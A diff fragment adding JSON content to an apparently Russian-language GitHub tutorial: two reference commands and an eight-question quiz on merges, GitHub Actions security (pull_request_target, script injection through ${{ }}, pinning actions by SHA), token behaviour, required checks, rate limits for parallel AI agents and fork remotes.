+        { "group": "Лимиты и доступ", "cmd": "gh api rate_limit", "text": "Сколько запросов к API осталось" },
+        { "cmd": "ssh -T git@github.com", "text": "Проверить вход по SSH" }
+      ]
+    },
+    {
+      "type": "quiz",
+      "title": "Проверьте себя",
+      "items": [
+        { "q": "PR из пяти коммитов слили через squash. Что в main?", "options": ["Пять коммитов", "Пять коммитов и коммит слияния", "Один коммит со всеми правками", "Ничего, нужен ещё push"], "answer": 2, "why": "Squash склеивает все коммиты PR в один. Откатить такую задачу - один git revert." },
+        { "q": "Чем опасен pull_request_target, если в нём собирается код из PR?", "options": ["Код из чужого форка получит секреты и токен на запись", "Он медленнее", "Он не работает для форков", "Ничем"], "answer": 0, "why": "pull_request_target работает с правами основного репозитория. Чужой код в нём - чужие руки на ваших секретах." },
+        { "q": "Почему заголовок PR нельзя вставлять в run через ${{ }}?", "options": ["Он слишком длинный", "Заголовок не бывает пустым", "GitHub это запрещает", "Подстановка идёт в текст скрипта, и автор заголовка выполнит свою команду"], "answer": 3, "why": "${{ }} вставляется до запуска оболочки. Через env значение остаётся просто текстом в переменной." },
+        { "q": "Зачем закреплять экшен по SHA, а не по тегу v7?", "options": ["Так быстрее", "Тег можно передвинуть на другой код, SHA - нет", "Тегов у экшенов не бывает", "Так требует Dependabot"], "answer": 1, "why": "Взломанный автор передвинет тег на вредный код, и все, кто ссылается на тег, его запустят. SHA неизменен." },
+        { "q": "Workflow сделал коммит через GITHUB_TOKEN, но CI на этот коммит не запустился. Почему?", "options": ["События от GITHUB_TOKEN нарочно не запускают другие workflow", "Сбой GitHub", "Нужно подождать сутки", "Коммит слишком маленький"], "answer": 0, "why": "Так GitHub защищается от бесконечных кругов. Нужен fine-grained токен, GitHub App или workflow_dispatch." },
+        { "q": "Обязательная проверка висит «Expected - Waiting». Вероятная причина?", "options": ["Кончился интернет", "PR слишком большой", "Джоба с этим именем не запустилась: фильтр paths или новое имя", "Нужен force push"], "answer": 2, "why": "Правило ждёт отчёт с конкретным именем. Если такая джоба не запускалась, ждать оно будет вечно." },
+        { "q": "Пять ИИ-агентов одновременно пушат ветки и сливают PR. Чем это грозит?", "options": ["Ничем", "Защита от злоупотреблений может заблокировать аккаунт", "Сервер станет быстрее", "Удалится main"], "answer": 1, "why": "Десятки операций за минуты похожи на работу спамера. Отправляйте пачкой и держите число параллельных сессий маленьким." },
+        { "q": "Как обычно называют remote исходного репозитория в форке?", "options": ["origin", "main", "fork", "upstream"], "answer": 3, "why": "origin - ваш форк, upstream - откуда он сделан. gh repo fork --clone настраивает оба." }
+      ]
+    },
+    {
+      "type": "project",
+      "title": "Где это в вашем проекте"
+    }
+  ]
+}
